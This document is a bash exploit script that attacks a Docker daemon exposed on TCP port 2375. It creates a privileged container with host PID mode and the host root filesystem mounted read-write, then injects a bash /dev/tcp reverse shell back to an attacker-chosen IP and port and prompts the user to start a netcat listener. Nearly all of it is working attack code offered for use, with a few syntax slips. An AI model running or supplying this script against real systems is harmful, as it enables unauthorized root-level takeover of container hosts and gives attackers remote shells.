#!/bin/bash

# Leverage an expose Docker daemon on a TCP socket (port 2375)
# to carry on a privilege escalation attacks, injecting a 
# reverse shell inside a newly created container. 

GREEN='\033[0;32m'
NC='\033[0m'
RED='\033[0;31m'
YELLOW='\033[1;33m'

check_command_output() {
	if [ ! $? -eq 0 ]; then
		echo -e "[*] ${RED}Error. Exiting ... ${NC}"
		exit 1;
	fi;
}

remoteip=$1
if [ -z ${remoteip} ]; then
	echo "Usage: exploit_restapi.sh {ip}"
	exit 1
fi;

echo -e "[*] ${GREEN}Check if 'nmap' is installed on the system${NC}"
nmap --help > /dev/null
if [ ! $? -eq 0 ]; then
	echo -e "[*] ${YELLOW}Installing 'nmap'${NC}"
	sudo apt-get install -y nmap	
fi;

echo -e "[*] ${GREEN}Check if remote host is accessible via 2375${NC}"
test -z $(nmap -sT ${remoteip} -p2375 | grep open) && echo -e "[*] ${RED}Host unreachable. Exiting${RED}" && exit 1 || (
	echo -e "[*] ${GREEN}Host reachable${NC}"
)

echo -e "[*] ${GREEN}Listing all images of the remote host${NC}"
curl -XGET http://${remoteip}:2375/images/json
check_command_output()

echo -e "[*] ${GREEN}Select an image (leave black to pull ubuntu:latest)${NC}"
read image
if [ -z ${image}]; then
	curl -XPOST http://${remoteip}:2375/images/create?fromImage=ubuntu:latest
	check_command_output()
fi;

echo -e "[*] ${GREEN}Running command 'docker run --rm --privileged --pid=host -v/:/mnt/fs ubuntu tail -f /dev/null'"
curl -XPOST http://${remoteip}:2375/containers/create?name=attack \
	-H "Content-Type: application/json" \
	-d '{"Image": "ubuntu:latest", "HostConfig": {
		"Privileged": true,
		"AutoRemove": true,
		"Mounts":[{
			"Target": "/mnt/fs",
			"Source": "/",
			"Type": "bind",
			"ReadOnly": false
		}],
		"NetworkMode": "bridge",
		"PidMode" : "host"
	}, "NetworkDisabled": false,"Entrypoint":["tail", "-f","/dev/null"], "OpenStdin": true}'

check_command_output()

echo -e "[*] ${GREEN}Starting container${NC}"
curl -XPOST http://${remoteip}:2375/containers/attack/start
check_command_output()

echo -e "[*] ${GREEN}Please insert your IP and a PORT"
echo -e "    ${GREEN}Insert the IP"
read lip
echo -e "    ${GREEN}Insert the PORT"
read lport

if [[ -z ${lip} || -z ${lport} ]]; then
	ips=$(hostname -I)
	lip=${ips:0:13}
	lport=4444
	echo -e "[*] ${YELLOW}No IP or PORT inserted using IP=${lip} and port=${lport}"
fi;

echo -e "[*] ${GREEN}Creating exec instance with a reverse shell to ${lip}:${lport}"
curl -XPOST http://${remoteip}:2375/containers/attack/exec \
	-H "Content-Type: application/json" \
	-d '{"Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/"'${lip}'"/"'${lport}'" 0>&1]}'

check_command_output()

echo -e "[*] ${GREEN}Exec instance created. Now starting ... ${NC}"
echo -e "[*] ${GREEN}Ensuring netcat is installed on the host machine${NC}"
nc --help > /dev/null
if [ ! $? -eq 0 ]; then
	echo -e "[*] ${YELLOW}Netcat is not installed. Installing ...${NC}"
	sudo apt-get install -y netcat
fi;

echo -e "[*] ${YELLOW}Make sure you are listening on port ${lport}${NC}"
echo -e "[*] ${YELLOW}Open another terminal and run 'nc -lvp 4444'. Press enter when done."
read null

echo -e "[*] ${GREEN}Starting the exec instance${NC}"
echo -e "[*] ${GREEN}Please inser the exec Id from the output of the previous command${NC}"
read execid

curl -XPOST http://${remoteip}:2375/exec/${execid}/start \
	-H "Content-Type: application/json" \
	-d '{"Tty": true}'

check_command_output()
